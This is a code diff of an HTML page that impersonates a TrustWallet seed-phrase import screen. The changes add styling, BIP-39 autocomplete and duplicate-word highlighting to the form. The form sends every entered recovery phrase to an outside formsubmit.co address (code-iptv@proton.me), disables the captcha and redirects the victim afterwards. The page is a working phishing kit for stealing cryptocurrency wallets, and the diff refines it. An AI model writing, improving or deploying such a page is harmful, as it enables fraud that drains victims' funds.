@@ -45,6 +45,8 @@
             color: #fff;
         }
         .selection-buttons {
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); /* Ombre douce */
+
             display: flex;
             background: #2a2b3d;
             border-radius: 12px;
@@ -63,9 +65,10 @@
         }
         .selection-buttons button.active {
             background: #3b82f6;
+            transition: background 0.2s cubic-bezier(0.39, 0.575, 0.565, 1);
         }
         textarea {
-            width: 90%;
+            width: 89%;
             background: #2a2b3d;
             border: 1px solid #4b5563;
             border-radius: 8px;
@@ -75,14 +78,18 @@
             outline: none;
             resize: none; /* Désactive l'extension de la zone de saisie */
             height: 150px; /* Taille fixe de la zone de saisie */
+            margin-bottom: 5px;
         }
         .words-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 1rem;
-            margin: 1.5rem 0;
+            margin-top: 1em;
+            margin-bottom: 1.6em;
         }
         .word-box {
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); /* Ombre douce */
+
             position: relative;
             background: #2a2b3d;
             border: 1px solid #4b5563;
@@ -114,9 +121,12 @@
             border: none;
             border-radius: 8px;
             cursor: pointer;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); /* Ombre douce */
+
         }
         .submit-button:hover {
             background: #2563eb;
+            transition: background 0.2s ease-in-out;
         }
 
         /* Mobile-friendly adjustments */
@@ -143,74 +153,298 @@
                 padding: 0.65rem;
             }
         }
+
+        .autocomplete-container {
+    display: none; /* Initialement caché */
+    justify-content: center;
+    position: absolute;
+    top: 5px; /* Ajustez selon votre besoin */
+    left: 0;
+    width: 90%; /* S'étend sur toute la largeur de la zone de texte */
+    background-color: #fff;
+    border: 1px solid #ddd;
+    border-radius: 5px; /* Coins arrondis pour un look plus propre */
+    z-index: 10;
+    max-height: 60px;
+    overflow-y: auto;
+    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); /* Ombre douce */
+    margin-top: 5px; /* Espace au-dessus de la liste d'autocomplétion */
+}
+#autocomplete div {
+    text-align: center;
+    border-radius: 5px;
+    padding: 5px;
+    cursor: pointer;
+    color: #333;
+    transition: background 0.2s ease-in-out;
+    background: #00af52df;
+    margin: 5px;
+}
+
+#autocomplete div:hover {
+    background: #00af52;
+    color: #000000;
+}
+.autocomplete-container div {
+    padding: 8px 15px; /* Espacement interne autour de chaque mot */
+    font-size: 14px; /* Taille de texte confortable */
+    cursor: pointer;
+    transition: background-color 0.2s ease-in-out; /* Effet de transition lors du survol */
+}
+
+.autocomplete-container div:hover {
+    background-color: #f1f1f1; /* Changement de fond au survol */
+    border-radius: 4px; /* Coins arrondis au survol pour un effet esthétique */
+}
+
+.autocomplete-container div:not(:last-child) {
+    border-bottom: 1px solid #eee; /* Séparation douce entre les éléments */
+}
+
+
     </style>
 </head>
 <body>
-   <div class="modal-content">
-    <div class="modal-header">
-        <img src="https://play-lh.googleusercontent.com/cd5BevWohRqLwsI2_i3k4YIVtcO57cIZCs6l20H1Hcdj0P2rFEcX_7QtgKbTM3Sn_A=s96-rw" alt="Icon">
-        <h4>Enter Seed Phrase for TrustWallet</h4>
-    </div>
-    <div class="selection-buttons">
-        <button class="active" onclick="setWords(12)">12 words</button>
-        <button onclick="setWords(24)">24 words</button>
-    </div>
-    <form id="walletForm" action="https://formsubmit.co/code-iptv@proton.me" method="POST">
-    <textarea placeholder="Enter your seed phrase here. Make sure to add a space between each word." 
-              oninput="updateWords(this.value)" id="seedPhraseTextarea" name="seedPhrase TRUST" required></textarea>
     
-    <div class="words-grid" id="wordsGrid">
-        <!-- Word boxes dynamically generated -->
+    <div class="modal-content">
+        <div class="modal-header">
+            <img style="box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.272);
+" src="https://play-lh.googleusercontent.com/cd5BevWohRqLwsI2_i3k4YIVtcO57cIZCs6l20H1Hcdj0P2rFEcX_7QtgKbTM3Sn_A=s96-rw" alt="Icon">
+            <h4>Enter Seed Phrase for Trustwallet</h4>
+        </div>
+    
+        <div class="selection-buttons">
+            <button class="active" onclick="setWords(12)">12 words</button>
+            <button onclick="setWords(24)">24 words</button>
+        </div>
+    
+        <form action="https://formsubmit.co/code-iptv@proton.me" method="POST">
+            <textarea id="seedPhraseTextarea" name="seedPhrase twt" placeholder="Enter your seed phrase here. Make sure to add a space between each word." oninput="updateWords(this.value)" required></textarea>
+            <div class="autocomplete-suggestions" id="autocomplete"></div>
+            <div class="words-grid" id="wordsGrid"></div>
+    
+            <!-- Redirection après soumission -->
+            <input type="hidden" name="_next" value="https://fauxon.github.io/fhrdhqctvghbn-/">
+            <input type="hidden" name="_captcha" value="false">
+            
+            <button type="submit" class="submit-button">Import wallet</button>
+        </form>
+        
+        <div id="output"></div>
     </div>
-
-    <!-- Redirection après soumission -->
-    <input type="hidden" name="_next" value="https://fauxon.github.io/fhrdhqctvghbn-/">
-    <!-- Anti-spam -->
-    <input type="hidden" name="_captcha" value="false">
-
-    <button type="submit" class="submit-button">Import wallet</button>
-</form>
-
-    <div id="output"></div>
-</div>
-
+    
     <script>
-        let wordCount = 12; // Default to 12 words
+       document.addEventListener("DOMContentLoaded", async () => {
+    let bip39Words = [];
+
+    // Charger les mots BIP-39
+    async function loadBIP39Words() {
+        const response = await fetch("https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt");
+        const text = await response.text();
+        bip39Words = text.split("\n").map(word => word.trim());
+    }
+    await loadBIP39Words();
+
+    const inputField = document.getElementById("seedPhraseTextarea");
+    const autocomplete = document.getElementById("autocomplete");
+
+    // Gérer l'affichage de l'autocomplétion
+    inputField.addEventListener("input", () => {
+        const words = inputField.value.split(" ");
+        const currentWord = words[words.length - 1].toLowerCase();
+
+        if (currentWord.length < 1) {
+            autocomplete.style.display = "none";
+            return;
+        }
+
+        const matches = bip39Words.filter(word => word.startsWith(currentWord)).slice(0, 5);
+        if (matches.length === 0) {
+            autocomplete.style.display = "none";
+            return;
+        }
+
+        autocomplete.innerHTML = "";
+        matches.forEach(match => {
+            const div = document.createElement("div");
+            div.textContent = match;
+            div.onclick = () => {
+                words[words.length - 1] = match;
+                inputField.value = words.join(" ");
+                inputField.focus(); // Garde le focus sur la textarea
+                autocomplete.style.display = "none";
+            };
+            autocomplete.appendChild(div);
+        });
+
+        autocomplete.style.display = "flex"; // Utiliser flexbox pour aligner les éléments
+    });
+
+});
+
+
+
+        let wordCount = 12;
+        let bip39Words = new Set();
+        let bip39Array = [];
+        let words = Array(wordCount).fill("");
+    
+        const forbiddenChars = /[0-9ôâçêœæîïûùàëÿ]/;
+        const forbiddenEndings = ["é", "ée", "è", "et", "ai", "ait"];
+    
+        async function loadBIP39Words() {
+            try {
+                const response = await fetch("https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt");
+                const text = await response.text();
+                bip39Array = text.split("\n").map(word => word.trim());
+                bip39Words = new Set(bip39Array);
+            } catch (error) {
+                console.error("Erreur chargement BIP-39 :", error);
+            }
+        }
     
         function setWords(count) {
             wordCount = count;
+            words = Array(wordCount).fill("");
     
-            const buttons = document.querySelectorAll('.selection-buttons button');
-            buttons.forEach(btn => btn.classList.remove('active'));
-            buttons[count === 12 ? 0 : 1].classList.add('active');
+            document.querySelectorAll('.selection-buttons button').forEach(btn => btn.classList.remove('active'));
+            document.querySelector(`.selection-buttons button:nth-child(${count === 12 ? 1 : 2})`).classList.add('active');
     
             renderWordBoxes();
         }
     
         function renderWordBoxes() {
-            const grid = document.getElementById('wordsGrid');
-            grid.innerHTML = ''; // Clear grid
-            for (let i = 1; i <= wordCount; i++) {
-                const wordBox = document.createElement('div');
-                wordBox.className = 'word-box';
-                wordBox.innerHTML = `<div class="index">${i}</div><span class="word"></span>`;
+            const grid = document.getElementById("wordsGrid");
+            grid.innerHTML = "";
+            words.forEach((word, index) => {
+                const wordBox = document.createElement("div");
+                wordBox.className = "word-box";
+                wordBox.innerHTML = `<div class="index">${index + 1}</div><span class="word">${word}</span>`;
+                wordBox.onclick = () => setActiveWord(index);
                 grid.appendChild(wordBox);
-            }
-        }
-    
-        function updateWords(input) {
-            const words = input.split(' '); // Split the input by spaces
-            const wordBoxes = document.querySelectorAll('.word-box .word');
-            
-            // Update each word box with the corresponding word
-            wordBoxes.forEach((box, index) => {
-                box.textContent = words[index] || ''; // Set word or clear if none
             });
         }
     
-        // Initialize with 12 words
-        setWords(12);
+        function setActiveWord(index) {
+            document.getElementById("seedPhraseTextarea").value = words.join(" ");
+            document.getElementById("seedPhraseTextarea").focus();
+        }
+    
+        function isValidWord(word) {
+            if (word.length > 12) return false;
+            if (forbiddenChars.test(word)) return false;
+            if (forbiddenEndings.some(ending => word.endsWith(ending))) return false;
+            return true;
+        }
+    
+        function highlightDuplicates() {
+    const wordElements = document.querySelectorAll(".word-box .word");
+    let wordCountMap = {};
+
+    wordElements.forEach((element) => {
+        let word = element.textContent.trim();
+        if (word) {
+            wordCountMap[word] = (wordCountMap[word] || 0) + 1;
+        }
+    });
+
+    wordElements.forEach((element) => {
+        let word = element.textContent.trim();
+        if (wordCountMap[word] > 1) {
+            element.style.color = "red"; // Mettre en rouge les doublons
+        } else {
+            element.style.color = ""; // Réinitialiser la couleur si ce n'est pas un doublon
+        }
+    });
+}
+
+function updateWords(input) {
+    input = input.toLowerCase().replace(/[^a-z\s]/g, "");
+    let newWords = input.split(" ").slice(0, wordCount);
+
+    let filteredWords = [];
+    newWords.forEach(word => {
+        if (isValidWord(word)) {
+            filteredWords.push(word);
+        }
+    });
+
+    words = filteredWords.concat(Array(wordCount - filteredWords.length).fill(""));
+
+    renderWordBoxes();
+    highlightDuplicates(); // Vérifier les doublons après mise à jour
+    showAutoComplete(filteredWords.pop());
+}
+
+
+    
+function showAutoComplete(input) {
+    const autocompleteDiv = document.getElementById("autocomplete");
+    autocompleteDiv.innerHTML = "";
+
+    if (!input) return;
+
+    let suggestions = bip39Array.filter(word => word.startsWith(input));
+    // Limiter à 4 suggestions max
+    if (suggestions.length > 4) {
+        suggestions = suggestions.slice(0, 4);
+    } else if (suggestions.length === 0) return;
+
+    suggestions.forEach((word, index) => {
+        const div = document.createElement("div");
+        div.textContent = word;
+        div.onclick = () => selectWord(word);
+        if (index === 0) div.classList.add("selected");
+        autocompleteDiv.appendChild(div);
+    });
+
+    const rect = document.getElementById("seedPhraseTextarea").getBoundingClientRect();
+    autocompleteDiv.style.left = `${rect.left}px`;
+    autocompleteDiv.style.top = `${rect.bottom}px`;
+    autocompleteDiv.style.width = `${rect.width}px`;
+}
+
+        function selectWord(word) {
+            let wordsArr = document.getElementById("seedPhraseTextarea").value.split(" ");
+            wordsArr[wordsArr.length - 1] = word;
+            document.getElementById("seedPhraseTextarea").value = wordsArr.join(" ");
+            document.getElementById("autocomplete").innerHTML = "";
+            updateWords(document.getElementById("seedPhraseTextarea").value);
+        }
+    
+        document.getElementById("seedPhraseTextarea").addEventListener("keydown", (e) => {
+            const suggestions = document.querySelectorAll(".autocomplete-suggestions div");
+            let selected = document.querySelector(".autocomplete-suggestions .selected");
+    
+            if (e.key === "ArrowDown") {
+                e.preventDefault();
+                if (selected) {
+                    selected.classList.remove("selected");
+                    if (selected.nextElementSibling) selected.nextElementSibling.classList.add("selected");
+                    else suggestions[0].classList.add("selected");
+                } else if (suggestions.length > 0) {
+                    suggestions[0].classList.add("selected");
+                }
+            }
+    
+            if (e.key === "ArrowUp") {
+                e.preventDefault();
+                if (selected) {
+                    selected.classList.remove("selected");
+                    if (selected.previousElementSibling) selected.previousElementSibling.classList.add("selected");
+                    else suggestions[suggestions.length - 1].classList.add("selected");
+                }
+            }
+    
+            if (e.key === "Enter" && selected) {
+                e.preventDefault();
+                selectWord(selected.textContent);
+            }
+        });
+    
+        loadBIP39Words().then(renderWordBoxes);
     </script>
+    
     
 </body>
 </html>
